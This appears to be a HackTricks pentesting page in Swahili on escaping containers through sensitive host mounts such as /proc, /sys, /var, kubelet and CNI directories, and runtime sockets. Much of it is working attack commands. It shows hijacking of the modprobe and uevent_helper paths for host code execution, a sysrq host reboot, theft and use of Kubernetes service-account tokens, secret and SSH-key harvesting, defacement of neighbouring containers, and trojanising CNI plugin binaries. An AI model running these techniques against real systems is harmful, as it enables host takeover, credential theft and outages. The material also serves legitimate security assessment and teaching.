# Mounts Nyeti za Host

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Host mounts ni mojawapo ya attack surfaces muhimu zaidi za vitendo za container-escape kwa sababu mara nyingi hubadilisha mwonekano wa process uliotengwa kwa uangalifu na kuurudisha kwenye mwonekano wa moja kwa moja wa resources za host. Hali hatari hazihusu `/` pekee. Bind mounts za `/proc`, `/sys`, `/var`, runtime sockets, state inayosimamiwa na kubelet, au paths zinazohusiana na devices zinaweza kufichua kernel controls, credentials, filesystems za containers jirani, na runtime management interfaces.

Ukurasa huu upo tofauti na kurasa binafsi za protection kwa sababu abuse model yake inahusisha vipengele vingi. Host mount inayoweza kuandikwa ni hatari kwa sababu fulani inayohusiana na mount namespaces, kwa sehemu user namespaces, kwa sehemu coverage ya AppArmor au SELinux, na kwa sehemu path halisi ya host iliyofichuliwa. Kuichukulia kama mada yake hufanya attack surface iwe rahisi zaidi kuichanganua.

## `/proc` Exposure

procfs ina taarifa za kawaida za processes pamoja na high-impact kernel control interfaces. Hivyo, bind mount kama `-v /proc:/host/proc` au container view inayofichua proc entries zinazoweza kuandikwa bila kutarajiwa inaweza kusababisha information disclosure, denial of service, au direct host code execution.

High-value procfs paths ni pamoja na:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Anza kwa kuangalia ni high-value procfs entries zipi zinaonekana au zinaweza kuandikwa:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Njia hizi zinavutia kwa sababu tofauti. `core_pattern`, `modprobe`, na `binfmt_misc` zinaweza kuwa njia za host code-execution zinapoweza kuandikwa. `kallsyms`, `kmsg`, `kcore`, na `config.gz` ni vyanzo muhimu vya reconnaissance kwa kernel exploitation. `sched_debug` na `mountinfo` hufichua muktadha wa process, cgroup, na filesystem ambao unaweza kusaidia kujenga upya mpangilio wa host kutoka ndani ya container.

Thamani ya kiutendaji ya kila njia ni tofauti, na kuzichukulia zote kana kwamba zina impact sawa hufanya triage iwe ngumu:

- `/proc/sys/kernel/core_pattern`
Ikiwa inaweza kuandikwa, hii ni mojawapo ya procfs paths zenye impact kubwa zaidi kwa sababu kernel itaendesha pipe handler baada ya crash. Container inayoweza kuelekeza `core_pattern` kwenye payload iliyohifadhiwa kwenye overlay yake au kwenye host path iliyomountiwa mara nyingi inaweza kupata host code execution. Tazama pia [read-only-paths.md](protections/read-only-paths.md) kwa mfano maalum.
- `/proc/sys/kernel/modprobe`
Path hii inadhibiti userspace helper inayotumiwa na kernel inapohitaji kuanzisha module-loading logic. Ikiwa inaweza kuandikwa kutoka kwenye container na kutafsiriwa katika host context, inaweza kuwa primitive nyingine ya host code-execution. Inavutia hasa inapounganishwa na njia ya ku-trigger helper path.
- `/proc/sys/vm/panic_on_oom`
Hii kwa kawaida si clean escape primitive, lakini inaweza kubadilisha memory pressure kuwa denial of service ya host nzima kwa kubadilisha hali za OOM kuwa kernel panic behavior.
- `/proc/sys/fs/binfmt_misc`
Ikiwa registration interface inaweza kuandikwa, attacker anaweza kusajili handler kwa magic value iliyochaguliwa na kupata host-context execution wakati file inayolingana inapoendeshwa.
- `/proc/config.gz`
Ni muhimu kwa kernel exploit triage. Husaidia kubaini ni subsystems, mitigations, na optional kernel features zipi zimewezeshwa bila kuhitaji host package metadata.
- `/proc/sysrq-trigger`
Mara nyingi ni denial-of-service path, lakini ni hatari sana. Inaweza ku-reboot, kusababisha panic, au kuvuruga host mara moja.
- `/proc/kmsg`
Hufichua kernel ring buffer messages. Ni muhimu kwa host fingerprinting, crash analysis, na katika baadhi ya environments kwa ku-leak information inayosaidia kernel exploitation.
- `/proc/kallsyms`
Ni muhimu inapoweza kusomeka kwa sababu hufichua exported kernel symbol information na inaweza kusaidia kushinda assumptions za address randomization wakati wa kernel exploit development.
- `/proc/[pid]/mem`
Hii ni direct process-memory interface. Ikiwa target process inaweza kufikiwa kwa ptrace-style conditions zinazohitajika, inaweza kuruhusu kusoma au kurekebisha memory ya process nyingine. Impact halisi inategemea sana credentials, `hidepid`, Yama, na ptrace restrictions, kwa hiyo ni path yenye nguvu lakini yenye masharti.
- `/proc/kcore`
Hufichua mwonekano wa system memory unaofanana na core image. File hii ni kubwa na ni ngumu kuitumia, lakini ikiwa inaweza kusomeka kwa maana, inaonyesha kuwa host memory surface imewekwa wazi vibaya.
- `/proc/kmem` na `/proc/mem`
Hizi ni raw memory interfaces zenye impact kubwa kihistoria. Kwenye systems nyingi za kisasa zimezimwa au zimewekewa restrictions kali, lakini zikiwa zipo na zinaweza kutumika zinapaswa kuchukuliwa kama critical findings.
- `/proc/sched_debug`
Huleak scheduling na task information ambayo inaweza kufichua process identities za host hata wakati process views nyingine zinaonekana safi kuliko ilivyotarajiwa.
- `/proc/[pid]/mountinfo`
Ni muhimu sana kwa kujenga upya mahali container ilipo kwenye host, ni paths zipi zinaungwa mkono na overlay, na ikiwa writable mount inalingana na host content au container layer pekee.

Ikiwa `/proc/[pid]/mountinfo` au overlay details zinaweza kusomeka, zitumie kurecover host path ya container filesystem:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Amri hizi ni muhimu kwa sababu mbinu kadhaa za host-execution zinahitaji kubadilisha path iliyo ndani ya container kuwa path inayolingana kwa mtazamo wa host.

### Mfano Kamili: `modprobe` Helper Path Abuse

Ikiwa `/proc/sys/kernel/modprobe` inaweza kuandikwa kutoka kwenye container na helper path inatafsiriwa katika host context, inaweza kuelekezwa kwenye payload inayodhibitiwa na attacker:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Trigger halisi hutegemea target na tabia ya kernel, lakini jambo muhimu ni kwamba helper path inayoweza kuandikwa inaweza kuelekeza invocation ya baadaye ya kernel helper kwenye maudhui ya host-path yanayodhibitiwa na attacker.

### Mfano Kamili: Kernel Recon Kwa `kallsyms`, `kmsg`, Na `config.gz`

Ikiwa lengo ni tathmini ya exploitability badala ya escape ya mara moja:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Amri hizi husaidia kujibu ikiwa taarifa muhimu za symbol zinaonekana, ikiwa kernel messages za hivi karibuni zinaonyesha hali ya kuvutia, na ni vipengele au mitigations gani za kernel zilizojumuishwa. Athari kwa kawaida si escape ya moja kwa moja, lakini hii inaweza kufupisha kwa kiasi kikubwa kernel-vulnerability triage.

### Mfano Kamili: SysRq Host Reboot

Ikiwa `/proc/sysrq-trigger` inaweza kuandikwa na kufikia host view:
```bash
echo b > /proc/sysrq-trigger
```
Athari yake ni kuanzishwa upya kwa host mara moja. Huu si mfano wa hila, lakini unaonyesha wazi kwamba kufichuliwa kwa procfs kunaweza kuwa hatari zaidi kuliko ufichuaji wa taarifa.

## Ufunuo wa `/sys`

sysfs hufichua kiasi kikubwa cha hali ya kernel na vifaa. Baadhi ya njia za sysfs ni muhimu hasa kwa fingerprinting, ilhali nyingine zinaweza kuathiri utekelezaji wa helper, tabia ya kifaa, usanidi wa security-module, au hali ya firmware.

Njia muhimu za sysfs ni pamoja na:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Njia hizi ni muhimu kwa sababu tofauti. `/sys/class/thermal` inaweza kuathiri tabia ya thermal-management na hivyo uthabiti wa host katika mazingira yenye exposure mbaya. `/sys/kernel/vmcoreinfo` inaweza ku-leak taarifa za crash-dump na mpangilio wa kernel zinazosaidia katika low-level host fingerprinting. `/sys/kernel/security` ni interface ya `securityfs` inayotumiwa na Linux Security Modules, kwa hivyo access isiyotarajiwa hapo inaweza kufichua au kubadilisha hali inayohusiana na MAC. Njia za EFI variables zinaweza kuathiri mipangilio ya boot inayotegemea firmware, jambo linalozifanya ziwe hatari zaidi kuliko configuration files za kawaida. `debugfs` iliyo chini ya `/sys/kernel/debug` ni hatari hasa kwa sababu imekusudiwa kuwa interface ya developer yenye matarajio machache zaidi ya usalama kuliko kernel APIs zilizolindwa kwa ajili ya production.

Amri muhimu za kukagua njia hizi ni:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Kinachofanya commands hizo ziwe muhimu:

- `/sys/kernel/security` inaweza kufichua ikiwa AppArmor, SELinux, au LSM nyingine inaonekana kwa njia ambayo ilipaswa kubaki kwenye host pekee.
- `/sys/kernel/debug` mara nyingi ndicho kinachotia wasiwasi zaidi katika kundi hili. Ikiwa `debugfs` ime-mountiwa na inaweza kusomwa au kuandikwa, tarajia surface pana inayoelekea kwenye kernel, ambapo risk halisi hutegemea debug nodes zilizowezeshwa.
- Ufunuaji wa EFI variables si wa kawaida sana, lakini ukiwepo una impact kubwa kwa sababu unagusa mipangilio inayoungwa mkono na firmware badala ya files za kawaida za runtime.
- `/sys/class/thermal` inahusika zaidi na uthabiti wa host na mwingiliano na hardware, si kwa escape iliyo wazi ya mtindo wa shell.
- `/sys/kernel/vmcoreinfo` ni chanzo cha host-fingerprinting na crash-analysis, chenye manufaa katika kuelewa hali ya kernel ya kiwango cha chini.

### Full Example: `uevent_helper`

Ikiwa `/sys/kernel/uevent_helper` inaweza kuandikwa, kernel inaweza kutekeleza helper inayodhibitiwa na attacker wakati `uevent` inapo-triggeriwa:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Sababu inayofanya hii ifanye kazi ni kwamba helper path inatafsiriwa kwa mtazamo wa host. Mara tu inapoanzishwa, helper huendeshwa katika context ya host badala ya ndani ya container ya sasa.

## Exposure ya `/var`

Kumount `/var` ya host ndani ya container mara nyingi hudharauliwa kwa sababu haionekani kuwa hatari kama kumount `/`. Kwa vitendo, hii inaweza kutosha kufikia runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens, na application filesystems za kontena jirani. Kwenye nodes za kisasa, `/var` mara nyingi ndipo container state yenye umuhimu mkubwa wa kiutendaji inapopatikana.

### Kubernetes Example

Pod yenye `hostPath: /var` mara nyingi inaweza kusoma projected tokens za pods nyingine na overlay snapshot content:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Amri hizi ni muhimu kwa sababu zinajibu ikiwa mount inafichua data za kawaida tu za application au credentials zenye athari kubwa za cluster. Service-account token inayoweza kusomeka inaweza kubadilisha mara moja local code execution kuwa ufikiaji wa Kubernetes API.

Ikiwa token ipo, thibitisha inachoweza kufikia badala ya kuishia kwenye token discovery:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Athari hapa inaweza kuwa kubwa zaidi kuliko ufikiaji wa node ya ndani. Token yenye RBAC pana inaweza kubadilisha `/var` iliyowekwa mount kuwa compromise ya cluster nzima.

### Mfano wa Docker na containerd

Kwenye Docker hosts, data husika mara nyingi hupatikana chini ya `/var/lib/docker`, huku kwenye Kubernetes nodes zinazotumia containerd inaweza kuwa chini ya `/var/lib/containerd` au paths mahususi za snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Ikiwa `/var` iliyowekwa wazi inaonyesha maudhui ya snapshot yanayoweza kuandikwa ya workload nyingine, attacker anaweza kubadilisha mafaili ya application, kuweka maudhui ya web, au kubadilisha startup scripts bila kugusa usanidi wa container ya sasa.

Mawazo madhubuti ya matumizi mabaya mara tu maudhui ya snapshot yanayoweza kuandikwa yanapopatikana:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Amri hizi ni muhimu kwa sababu zinaonyesha familia kuu tatu za athari za `/var` iliyomountiwa: tampering ya application, urejeshaji wa secrets, na lateral movement kuelekea workloads jirani.

## State, Plugins, Na CNI Paths Za Kubelet

Mount ya `/var/lib/kubelet`, `/opt/cni/bin`, au `/etc/cni/net.d` mara nyingi huwekwa wazi kupitia privileged DaemonSets, CNI agents, CSI node plugins, GPU operators, na storage helpers. Mount hizi ni rahisi kupuuzwa kama "node plumbing", lakini ziko moja kwa moja kwenye execution path ya pods mpya na mara nyingi huwa na kubelet credentials, projected secrets, registration sockets, na executable host-side plugin binaries.

Targets zenye thamani kubwa ni pamoja na:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Amri muhimu za ukaguzi ni:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Kwa nini paths hizi ni muhimu:

- `/var/lib/kubelet/pki` inaweza kufichua vyeti vya client vya kubelet na credentials nyingine za node-local ambazo wakati mwingine zinaweza kutumiwa tena dhidi ya API server au TLS endpoints zinazoelekea kubelet, kulingana na muundo wa cluster.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` mara nyingi huwa na projected service-account tokens na Secrets zilizomountiwa kwa pods jirani kwenye node hiyo.
- `/var/lib/kubelet/pod-resources/kubelet.sock` hasa ni reconnaissance surface, lakini ni muhimu sana: hufichua ni pods na containers zipi zinazomiliki GPUs, hugepages, vifaa vya SR-IOV, na rasilimali nyingine adimu za node-local kwa sasa.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, na `/var/lib/kubelet/plugins_registry` hufichua ni CSI, DRA, na device plugins zipi zilizosakinishwa na ni sockets zipi kubelet inatarajiwa kuwasiliana nazo. Ikiwa directories hizo zinaweza kuandikwa badala ya kusomeka tu, finding huwa kubwa zaidi.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` na `/etc/cni/net.d` ziko moja kwa moja kwenye njia ya usanidi wa pod-network. Ufikiaji wa kuandika humo mara nyingi huwa primitive ya host execution iliyocheleweshwa, badala ya kuwa kufichuka kwa configuration pekee.<sup>[[2]](#references)</sup>

### Mfano Kamili: `/opt/cni/bin` Inayoweza Kuandikwa

Ikiwa directory ya host ya CNI binaries imemountiwa kwa read-write, kubadilisha plugin kunaweza kutosha kupata host execution wakati mwingine kubelet itakapounda pod sandbox kwenye node hiyo:<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Hili si jambo la haraka kama `docker.sock` iliyomountiwa, lakini mara nyingi huwa halisi zaidi katika infrastructure pods za Kubernetes zilizocompromise. Jambo muhimu ni kwamba binary iliyorekebishwa huendeshwa baadaye na mtiririko wa usanidi wa mtandao wa host, si na container ya sasa.

## Runtime Sockets

Sensitive host mounts mara nyingi hujumuisha runtime sockets badala ya directories kamili. Hizi ni muhimu sana kiasi kwamba zinastahili kurudiwa wazi hapa:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Tazama [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) kwa exploitation flows kamili mara mojawapo ya sockets hizi inapomountiwa.

Kama pattern ya kwanza ya haraka ya interaction:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Ikiwa mojawapo ya hizi itafanikiwa, njia kutoka kwa "mounted socket" hadi "start a more privileged sibling container" huwa kwa kawaida fupi zaidi kuliko njia yoyote ya kernel breakout.

## Writable Host Path Task Hijack

Writable host mount haihitaji kuonyesha `/` ili iwe hatari. Ikiwa path iliyomountiwa ina scripts, config files, hooks, plugins, au files zinazotumiwa baadaye na scheduled task au service ya upande wa host, container inaweza kubadilisha kile ambacho host itatekeleza.

Mfuatano wa jumla wa ukaguzi:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Ikiwa faili inayoweza kuandikwa inatumiwa na host process, weka payload rahisi na inayoonekana wakati wa kufanya majaribio:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
Sehemu muhimu ni trust boundary: uandishi unafanyika ndani ya container, lakini execution hufanyika baadaye katika muktadha wa host service. Hii hubadilisha hostPath au bind mount nyembamba kuwa primitive ya delayed host-code-execution.

## CVEs Zinazohusiana na Mount

Host mounts pia huingiliana na vulnerabilities za runtime. Mifano muhimu ya hivi karibuni ni:

- `CVE-2024-21626` katika `runc`, ambapo leaked directory file descriptor inaweza kuweka working directory kwenye host filesystem.
- `CVE-2024-23651`, `CVE-2024-23652`, na `CVE-2024-23653` katika BuildKit, ambapo Dockerfiles hasidi, frontends, na `RUN --mount` flows zinaweza kurejesha host file access, deletion, au elevated privileges wakati wa builds.
- `CVE-2024-1753` katika Buildah na Podman build flows, ambapo crafted bind mounts wakati wa build zinaweza kufichua `/` kwa read-write.
- `CVE-2025-47290` katika `containerd` 2.1.0, ambapo TOCTOU wakati wa image unpack inaweza kuruhusu image iliyoundwa mahsusi kurekebisha host filesystem wakati wa pull.

CVE hizi ni muhimu hapa kwa sababu zinaonyesha kuwa mount handling haihusu tu operator configuration. Runtime yenyewe pia inaweza kuanzisha mount-driven escape conditions.

## Ukaguzi

Tumia commands hizi kutambua kwa haraka mount exposures zenye thamani kubwa zaidi:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Kinachovutia hapa:

- Host root, `/proc`, `/sys`, `/var`, na runtime sockets zote ni findings za kipaumbele cha juu.
- Maingizo ya proc/sys yanayoweza kuandikwa mara nyingi humaanisha kuwa mount inaonyesha vidhibiti vya kernel vya host nzima badala ya mwonekano salama wa container.
- Njia za `/var` zilizowekwa kama mount zinahitaji ukaguzi wa credentials na workloads jirani, si ukaguzi wa filesystem pekee.
- Kubelet state directories na njia za CNI/plugin zinapaswa kupewa kipaumbele sawa na runtime sockets kwa sababu mara nyingi ziko moja kwa moja kwenye njia ya node ya kuunda pods na kusambaza credentials.

## Marejeleo

- [1] [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)

{{#include ../../../banners/hacktricks-training.md}}
